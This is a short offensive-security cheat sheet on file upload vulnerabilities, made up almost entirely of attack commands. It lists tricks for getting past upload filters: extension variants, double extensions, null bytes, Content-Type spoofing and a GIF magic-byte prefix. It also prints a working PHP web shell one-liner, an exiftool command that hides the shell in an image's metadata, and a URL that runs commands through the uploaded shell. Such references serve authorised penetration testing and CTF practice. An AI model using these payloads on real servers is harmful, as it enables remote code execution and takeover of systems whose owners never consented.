# File Upload Vulnerabilities

## Bypass Techniques
```bash
# Change extension
shell.php -> shell.php3, shell.phtml, shell.php5
shell.php -> shell.php.jpg (double extension)
shell.php -> shell.php%00.jpg (null byte)

# Content-Type manipulation
Change: Content-Type: application/x-php
To: Content-Type: image/jpeg

# Magic bytes bypass
Add GIF header: GIF89a;<?php system($_GET['cmd']);?>

# Image with embedded PHP
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.png
```

## File Upload to RCE
```bash
# If you know the upload path:
# Upload shell.php, then access:
http://$TARGET_IP/uploads/shell.php?cmd=id
```
